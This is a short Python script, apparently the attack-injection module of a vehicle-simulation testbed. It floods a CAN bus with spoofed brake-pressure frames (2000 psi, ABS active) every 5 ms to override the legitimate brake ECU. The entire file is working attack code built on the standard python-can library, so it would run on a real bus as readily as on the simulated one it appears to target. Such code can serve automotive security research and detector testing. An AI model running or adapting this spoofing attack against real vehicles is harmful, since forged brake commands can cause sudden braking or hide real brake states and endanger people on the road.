import time
import struct
import can
import os
import sys

sys.path.append(os.path.join(os.path.dirname(__file__), "..", "vehicle-sim"))
from can_bus_utils import get_can_bus, CAN_ID_BRAKES, encode_brake_data

def run_spoofing_attack(duration=5, target_id=CAN_ID_BRAKES):
    """Spoofs high-pressure brake command signals onto the bus out of physical sequence."""
    bus = get_can_bus()
    print(f"[Attack Injector] Launching Spoofing Attack on ID 0x{target_id:03X} (duration={duration}s)...")
    start_t = time.time()
    count = 0
    
    # Fake sudden maximum brake pressure (2000 psi + ABS active)
    spoofed_payload = encode_brake_data(pressure_psi=2000, abs_active=True)
    
    while time.time() - start_t < duration:
        msg = can.Message(arbitration_id=target_id, data=spoofed_payload, is_extended_id=False)
        try:
            bus.send(msg)
            count += 1
        except Exception as e:
            print(f"[Attack Injector Error] Spoofing send failure: {e}")
        time.sleep(0.005) # rapid spoofing overriding legitimate brake ECU
        
    print(f"[Attack Injector] Spoofing Attack completed. Sent {count} spoofed frames.")
    return count

if __name__ == "__main__":
    dur = float(sys.argv[1]) if len(sys.argv) > 1 else 5.0
    run_spoofing_attack(duration=dur)
